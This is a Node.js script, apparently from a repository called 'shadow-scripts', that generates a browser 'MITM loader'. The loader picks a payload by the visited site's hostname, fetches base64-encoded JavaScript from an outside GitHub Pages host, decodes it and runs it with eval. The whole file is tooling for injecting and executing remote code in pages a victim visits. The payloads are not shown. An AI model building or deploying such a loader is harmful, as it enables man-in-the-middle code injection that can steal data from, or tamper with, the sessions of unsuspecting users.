#!/usr/bin/env node

/**
 * gen-mitm-loader.js
 * ──────────────────────────────────────────────────────────────────────────
 * Scans the payloads directory for .b64 files and generates a
 * mitm-loader.js script that will lazy-load & eval the matching payload
 * based on window.location.hostname.
 */

const fs = require("fs");
const path = require("path");

// Directory where .b64 payloads live, relative to project root
const PAYLOADS_DIR = path.resolve(__dirname, "../apps/loader/public/payloads");
// Where to write the generated loader
const OUTPUT_PATH = path.resolve(__dirname, "../apps/loader/public/scripts/mitm-loader.js");

// Base URL to fetch payloads from; override with env var if needed
const BASE_URL =
  process.env.BASE_URL ||
  "https://popdeuxrem.github.io/shadow-scripts/payloads";

// Recursively walk a directory and collect all .b64 files (relative to PAYLOADS_DIR)
function collectPayloads(dir, prefix = "") {
  let results = [];
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const fullPath = path.join(dir, entry.name);
    const relPath = prefix ? `${prefix}/${entry.name}` : entry.name;
    if (entry.isDirectory()) {
      results = results.concat(collectPayloads(fullPath, relPath));
    } else if (entry.isFile() && entry.name.endsWith(".b64")) {
      results.push(relPath.replace(/\\/g, "/"));
    }
  }
  return results;
}

const allPayloadFiles = collectPayloads(PAYLOADS_DIR);

// Build a name→URL map: strip “.js.b64” or “.b64” to get the key
const payloadMap = allPayloadFiles.reduce((map, relPath) => {
  const key = relPath
    .replace(/\.js\.b64$/, "")
    .replace(/\.b64$/, "")
    .replace(/\//g, "_"); // flatten directories into a single identifier
  const url = `${BASE_URL}/${relPath}`;
  map[key] = url;
  return map;
}, {});

// The browser loader script
const loaderScript = `
// == MITM Loader Auto-Generated ==
(function(){
  const PAYLOADS = ${JSON.stringify(payloadMap, null, 2)};

  async function loadPayload(name) {
    const url = PAYLOADS[name];
    if (!url) {
      console.warn("[MITM] No payload mapping for", name);
      return;
    }
    try {
      const resp = await fetch(url, { cache: "no-cache" });
      if (!resp.ok) throw new Error(resp.statusText);
      const b64 = await resp.text();
      const js = atob(b64);
      (0,eval)(js);
      console.log("[MITM] Loaded payload:", name);
    } catch (err) {
      console.error("[MITM] Failed to load payload", name, err);
    }
  }

  // Pick the first key that matches location.hostname
  const host = location.hostname;
  for (const name of Object.keys(PAYLOADS)) {
    if (host.includes(name)) {
      loadPayload(name);
      break;
    }
  }
})();
`;

fs.mkdirSync(path.dirname(OUTPUT_PATH), { recursive: true });
fs.writeFileSync(OUTPUT_PATH, loaderScript, "utf8");
console.log(`✅ mitm-loader.js generated at ${OUTPUT_PATH}`);
